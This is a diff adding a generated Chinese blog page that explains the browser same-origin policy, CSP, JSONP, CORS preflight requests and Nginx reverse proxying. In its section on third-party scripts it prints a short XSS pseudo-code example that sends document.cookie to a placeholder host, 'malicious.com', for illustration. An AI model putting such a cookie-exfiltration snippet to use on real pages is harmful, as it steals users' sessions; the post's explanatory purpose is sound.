@@ -1,0 +1,575 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="huyinglin">
+  <meta name="keywords" content="">
+  <title>浏览器的同源策略 - Faz Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Faz Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/owl.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-08-18 00:14" pubdate>
+      2020年8月18日 凌晨
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      39
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">浏览器的同源策略</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>同源策略是浏览器网络安全中重要的安全策略。一个正常的逻辑是，一个网站的控制权应该只能是网站的拥有者，显然别人想到我的网站请求一些数据或者把网站的内容改一改是侵犯了网站拥有者的隐私和数据安全。</p>
+<p>但 Web 世界是开放的，它最重要的目的就是资源共享。Web 世界的理念就是，任何资源都可以接入其中。我们的网站可以加载并执行别人网站的脚本文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。</p>
+<p>但是自由可能就意味着无序和混乱。如果页面行为没有任何限制，就会出现很多不可控的问题。所以，页面中最基础、最核心的安全策略：<strong>同源策略</strong>就出现了。</p>
+<h2 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h2><p>要了解什么是同源策略，我们得先来看看什么是同源。</p>
+<p><strong>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。</strong>比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 huyinglin.net，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p>
+<pre><code class="hljs jsx">https:<span class="hljs-comment">//huyinglin.net/?category=1</span>
+https:<span class="hljs-comment">//huyinglin.net/?category=0</span></code></pre>
+
+<p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。<strong>两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</strong></p>
+<p>具体来讲，同源策略主要表现在 <strong>DOM、Web 数据和网络</strong>这三个层面。</p>
+<h3 id="DOM-层面"><a href="#DOM-层面" class="headerlink" title="DOM 层面"></a>DOM 层面</h3><p>同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p>
+<p>如果从一个页面打开了另一个页面，这两个页面是同源关系，那么就可以在第二个页面通过 BOM API 操作第一个页面。</p>
+<p>如果两个页面不是同源的，那么它们就无法相互操作 DOM 了。这时浏览器会抛出下面的异常信息：</p>
+<pre><code class="hljs jsx">Blocked a frame <span class="hljs-keyword">with</span> origin <span class="hljs-string">&quot;https://www.huyinglin.net&quot;</span> <span class="hljs-keyword">from</span> accessing a cross-origin frame.</code></pre>
+
+<h3 id="数据层面"><a href="#数据层面" class="headerlink" title="数据层面"></a>数据层面</h3><p>同源策略限制了不同源的站点读取当前站点的 <strong>Cookie、IndexDB、LocalStorage</strong> 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。</p>
+<h3 id="网络层面"><a href="#网络层面" class="headerlink" title="网络层面"></a>网络层面</h3><p>我们最常见的就是网络层面的限制。同源策略限制了一个站点不能向不同源的站点发送请求。</p>
+<h2 id="安全和便利性的权衡"><a href="#安全和便利性的权衡" class="headerlink" title="安全和便利性的权衡"></a>安全和便利性的权衡</h2><p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>
+<p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p>
+<h3 id="页面中可以嵌入第三方资源"><a href="#页面中可以嵌入第三方资源" class="headerlink" title="页面中可以嵌入第三方资源"></a>页面中可以嵌入第三方资源</h3><p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p>
+<p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p>
+<p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码：</p>
+<img src="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/img.png" srcset="/img/loading.gif" class="">
+
+<p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p>
+<p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p>
+<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onClick</span>(<span class="hljs-params"></span>)</span>&#123;
+  <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://malicious.com?cookie = <span class="hljs-subst">$&#123;<span class="hljs-built_in">document</span>.cookie&#125;</span>`</span>
+  open(url)
+&#125;
+onClick()</code></pre>
+
+<p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p>
+<p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。CSP 的使用方法是在 HTTP 头部通过 Content-Security-Policy 字段来指定你的策略。具体使用如下：</p>
+<pre><code class="hljs jsx">Content-Security-Policy: <span class="hljs-keyword">default</span>-src <span class="hljs-string">&#x27;self&#x27;</span>; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code></pre>
+
+<h3 id="跨域资源共享和跨文档消息机制"><a href="#跨域资源共享和跨文档消息机制" class="headerlink" title="跨域资源共享和跨文档消息机制"></a>跨域资源共享和跨文档消息机制</h3><p>跨域资源共享（CORS）机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。我们在下面会具体介绍。</p>
+<p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p>
+<h2 id="如何实现跨域？"><a href="#如何实现跨域？" class="headerlink" title="如何实现跨域？"></a>如何实现跨域？</h2><p>同源策略对于页面安全起了至关重要的作用，但实际开发中确有很多跨域的需求。下面我们来看看跨域的几种常见方法。</p>
+<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONP 可以说是最简单的跨域方法了。它的原理是利用 script 标签没有跨域限制的“漏洞”，获取其他网站的数据。其使用方式如下：</p>
+<pre><code class="hljs jsx">&lt;script src=<span class="hljs-string">&quot;https://xx.com/api/xxx.js?callbackName=callback&quot;</span>&gt;&lt;/script&gt;</code></pre>
+
+<pre><code class="hljs jsx"><span class="hljs-comment">// 后端返回的 js 文件 xxx.js。</span>
+<span class="hljs-comment">// callback 名字可根据前端传的回调名字来改变</span>
+
+callback(&#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;); <span class="hljs-comment">// 后端需要传递的数据直接作为调用参数</span></code></pre>
+
+<p>JSONP优点是简单兼容性好，可用于解决主流浏览器的跨域数据访问的问题。缺点是仅支持 get 方法具有局限性，不安全可能会遭受XSS攻击。</p>
+<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>跨域资源共享（CORS）<strong>需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现</strong>。</p>
+<p>浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。</p>
+<p>服务端设置 Access-Control-Allow-Origin 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</p>
+<p>虽然设置 CORS 和前端没什么关系，但是通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为<strong>简单请求</strong>和<strong>复杂请求</strong>。</p>
+<p><strong>一、简单请求</strong></p>
+<p>凡是满足下面条件的属于简单请求:</p>
+<ul>
+<li>请求方法为 GET、POST 或者 HEAD</li>
+<li>请求头的取值范围: Accept、Accept-Language、Content-Language、Content-Type(只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>)</li>
+</ul>
+<p>请求发出去之前，浏览器做了什么？</p>
+<p>它会自动在请求头当中，添加一个 <strong>Origin</strong> 字段，用来说明请求来自哪个源。服务器拿到请求之后，在回应时对应地添加 <strong>Access-Control-Allow-Origin</strong> 字段，如果 Origin 不在这个字段的范围中，那么浏览器就会将响应拦截。</p>
+<p>因此，Access-Control-Allow-Origin字段是服务器用来决定浏览器是否拦截这个响应，这是必需的字段。与此同时，其它一些可选的功能性的字段，用来描述如果不会拦截，这些字段将会发挥各自的作用。</p>
+<p><strong>二、复杂请求</strong></p>
+<p>不符合以上条件的请求就是复杂请求了。简单请求其实就是原生 HTML form 提供的请求。非简单请求就是普通 HTML Form 无法实现的请求。比如 PUT 方法、需要其他的内容编码方式、自定义头之类的。</p>
+<p>复杂请求的CORS请求，会在正式通信之前，增加一次 HTTP 查询请求，称为”预检”请求，该请求是 option 方法的，通过该请求来知道服务端是否允许跨域请求。</p>
+<p>我们以 PUT 方法为例。</p>
+<pre><code class="hljs jsx"><span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://xxx.com&#x27;</span>;
+<span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
+xhr.open(<span class="hljs-string">&#x27;PUT&#x27;</span>, url, <span class="hljs-literal">true</span>);
+xhr.setRequestHeader(<span class="hljs-string">&#x27;X-Custom-Header&#x27;</span>, <span class="hljs-string">&#x27;xxx&#x27;</span>);
+xhr.send();</code></pre>
+
+<p>当这段代码执行后，首先会发送预检请求。这个预检请求的请求行和请求体是下面这个格式:</p>
+<pre><code class="hljs jsx">OPTIONS / HTTP/<span class="hljs-number">1.1</span>
+Origin: 当前地址
+Host: xxx.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: X-Custom-Header</code></pre>
+
+<p>预检请求的方法是OPTIONS，同时会加上Origin源地址和Host目标地址，这很简单。同时也会加上两个关键的字段:</p>
+<ul>
+<li>Access-Control-Request-Method, 列出 CORS 请求用到哪个HTTP方法</li>
+<li>Access-Control-Request-Headers，指定 CORS 请求将要加上什么请求头</li>
+</ul>
+<p>这是<strong>预检请求</strong>。接下来是<strong>响应字段</strong>，响应字段也分为两部分，一部分是对于预检请求的响应，一部分是对于 CORS 请求的响应。</p>
+<p>预检请求的响应。如下面的格式:</p>
+<pre><code class="hljs jsx">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: X-Custom-Header
+Access-Control-Allow-Credentials: <span class="hljs-literal">true</span>
+Access-Control-Max-Age: <span class="hljs-number">1728000</span>
+Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>
+Content-Encoding: gzip
+Content-Length: <span class="hljs-number">0</span></code></pre>
+
+<p>其中有这样几个关键的响应头字段:</p>
+<pre><code class="hljs jsx">Access-Control-Allow-Origin: 表示可以允许请求的源，可以填具体的源名，也可以填*表示允许任意源请求。
+Access-Control-Allow-Methods: 表示允许的请求方法列表。
+Access-Control-Allow-Credentials: 简单请求中已经介绍。
+Access-Control-Allow-Headers: 表示允许发送的请求头字段
+Access-Control-Max-Age: 预检请求的有效期，在此期间，不用发出另外一条预检请求。</code></pre>
+
+<p>在预检请求的响应返回后，如果请求不满足响应头的条件，则触发XMLHttpRequest的onerror方法，当然后面真正的CORS请求也不会发出去了。</p>
+<p>CORS 请求的响应。绕了这么一大转，到了真正的 CORS 请求就容易多了，现在它和简单请求的情况是一样的。浏览器自动加上Origin字段，服务端响应头返回Access-Control-Allow-Origin。可以参考以上简单请求部分的内容。</p>
+<h3 id="Nginx-反向代理"><a href="#Nginx-反向代理" class="headerlink" title="Nginx 反向代理"></a>Nginx 反向代理</h3><p>Nginx 是一种高性能的反向代理服务器，可以用来轻松解决跨域问题。</p>
+<img src="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/img1.png" srcset="/img/loading.gif" class="">
+
+<p>正向代理帮助客户端访问客户端自己访问不到的服务器，然后将结果返回给客户端。</p>
+<p>反向代理拿到客户端的请求，将请求转发给其他的服务器，主要的场景是维持服务器集群的负载均衡，换句话说，反向代理帮其它的服务器拿到请求，然后选择一个合适的服务器，将请求转交给它。</p>
+<p>因此，两者的区别就很明显了，正向代理服务器是帮客户端做事情，而反向代理服务器是帮其它的服务器做事情。</p>
+<p>好了，那 Nginx 是如何来解决跨域的呢？</p>
+<p>比如说现在客户端的域名为client.com，服务器的域名为server.com，客户端向服务器发送 Ajax 请求，当然会跨域了，那这个时候让 Nginx 登场了，通过下面这个配置:</p>
+<pre><code class="hljs jsx">server &#123;
+  listen  <span class="hljs-number">80</span>;
+  server_name  client.com;
+  location /api &#123;
+    proxy_pass server.com;
+  &#125;
+&#125;</code></pre>
+
+<p>Nginx 相当于起了一个跳板机，这个跳板机的域名也是client.com，让客户端首先访问 client.com/api，这当然没有跨域，然后 Nginx 服务器作为反向代理，将请求转发给server.com，当响应返回时又将响应给到客户端，这就完成整个跨域请求的过程。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>CORS 支持所有类型的 HTTP 请求，是跨域 HTTP 请求的根本解决方案。</li>
+<li>JSONP 只支持GET请求，JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</li>
+<li>日常工作中，用得比较多的跨域方案是 CORS 和 Nginx 反向代理</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%B7%A8%E5%9F%9F/">跨域</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">浏览器安全</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/17/%E7%99%BB%E5%BD%95%E9%89%B4%E6%9D%83/">
+                        <span class="hidden-mobile">登录鉴权</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "浏览器的同源策略&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
